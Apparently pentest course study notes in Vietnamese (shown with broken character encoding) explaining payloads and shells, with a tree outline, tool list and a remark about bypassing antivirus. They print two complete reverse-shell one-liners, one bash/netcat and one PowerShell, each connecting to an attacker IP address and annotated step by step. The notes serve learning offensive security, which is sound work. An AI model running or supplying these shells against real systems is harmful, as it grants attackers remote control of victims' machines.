Payloads & Shells
â”‚
â”œâ”€â”€ KhÃ¡i niá»‡m
â”‚   â”œâ”€â”€ Payload = mÃ£ khai thÃ¡c
â”‚   â””â”€â”€ Shell = mÃ´i trÆ°á»ng Ä‘iá»u khiá»ƒn
â”‚
â”œâ”€â”€ One-liners
â”‚   â”œâ”€â”€ Bash/Netcat reverse
â”‚   â””â”€â”€ PowerShell reverse
â”‚
â”œâ”€â”€ Script Payloads
â”‚   â””â”€â”€ Nishang Invoke-PowerShellTcp
â”‚
â”œâ”€â”€ Äáº·c Ä‘iá»ƒm
â”‚   â”œâ”€â”€ OS-specific
â”‚   â”œâ”€â”€ HÃ¬nh thá»©c: 1 dÃ²ng / script / auto
â”‚   â””â”€â”€ TrÃ¡nh AV detection
â”‚
â””â”€â”€ CÃ´ng cá»¥
    â”œâ”€â”€ Metasploit
    â”œâ”€â”€ MSFvenom
    â””â”€â”€ Netcat / Powercat




1. KhÃ¡i niá»‡m cÆ¡ báº£n
  Payload: trong báº£o máº­t, lÃ  Ä‘oáº¡n lá»‡nh hoáº·c mÃ£ khai thÃ¡c lá»— há»•ng cá»§a HÄH / á»©ng dá»¥ng.
    â†’ ChÃ­nh lÃ  pháº§n â€œthá»±c hiá»‡n hÃ nh Ä‘á»™ng Ä‘á»™c háº¡iâ€.
  Shell: mÃ´i trÆ°á»ng cho phÃ©p tÆ°Æ¡ng tÃ¡c vá»›i há»‡ thá»‘ng (qua reverse shell, bind shell, web shellâ€¦).
  Payloads thÆ°á»ng Ä‘Æ°á»£c AV/EDR cháº·n vÃ¬ chÃºng chá»©a lá»‡nh nguy hiá»ƒm. Hiá»ƒu rÃµ cÃ¡ch hoáº¡t Ä‘á»™ng giÃºp ta bypass Ä‘Æ°á»£c.

2. VÃ­ dá»¥ Payload One-liner
  ğŸ”¹ Netcat/Bash Reverse Shell
      rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
        rm -f /tmp/f: xÃ³a file náº¿u cÃ³.
        mkfifo /tmp/f: táº¡o FIFO named pipe.
        cat /tmp/f |: Ä‘á»c tá»« pipe chuyá»ƒn sang input cá»§a lá»‡nh tiáº¿p theo.
        /bin/bash -i 2>&1 |: cháº¡y shell tÆ°Æ¡ng tÃ¡c, redirect cáº£ stdout & stderr.
        nc 10.10.14.12 7777 > /tmp/f: káº¿t ná»‘i tá»›i attacker, gá»­i shell ra ngoÃ i.
  ğŸ‘‰ Káº¿t quáº£: má»Ÿ reverse shell tá»« victim vá» attacker.

  ğŸ”¹ PowerShell Reverse Shell
    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);
    $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
    while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
    $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
      Giáº£i thÃ­ch 
        -nop -c: cháº¡y khÃ´ng load profile, thá»±c thi command.
        TCPClient: má»Ÿ káº¿t ná»‘i TCP tá»›i attacker.
        GetStream(): táº¡o stream dá»¯ liá»‡u.
        whi le loop: Ä‘á»c dá»¯ liá»‡u tá»« attacker.
        Invoke-Expression (iex): cháº¡y lá»‡nh attacker gá»­i tá»›i.
        Tráº£ káº¿t quáº£: gá»­i ngÆ°á»£c output vá» qua TCP.
ğŸ‘‰ Cho phÃ©p attacker cÃ³ PowerShell interactive shell trÃªn victim.

3. Script Payloads (vÃ­ dá»¥ Nishang â€“ Invoke-PowerShellTcp)
    Há»— trá»£ Reverse hoáº·c Bind shell.
    CÃ³ thá»ƒ dÃ¹ng cáº£ IPv4 & IPv6.
    Cho phÃ©p attacker:
      Káº¿t ná»‘i vÃ o victim (bind).
      Victim chá»§ Ä‘á»™ng káº¿t ná»‘i ra ngoÃ i (reverse).

4. Äáº·c Ä‘iá»ƒm Payloads
    HÃ¬nh thá»©c Ä‘a dáº¡ng:
      One-liner (dá»… copy-paste).
      Script (.ps1, .sh).
      Auto-generated (MSFvenom, Metasploit).
    TÃ¹y OS / shell / ngÃ´n ngá»¯ trÃªn target â†’ chá»n payload phÃ¹ há»£p.
    Má»¥c tiÃªu cuá»‘i: cÃ³ Ä‘Æ°á»£c shell Ä‘iá»u khiá»ƒn há»‡ thá»‘ng.

5. CÃ´ng cá»¥ há»— trá»£
  Metasploit Framework: táº¡o payload, listener, exploit tá»± Ä‘á»™ng.
  MSFvenom: crafting payload.
  Netcat / Powercat: láº¯ng nghe káº¿t ná»‘i hoáº·c gá»­i payload.














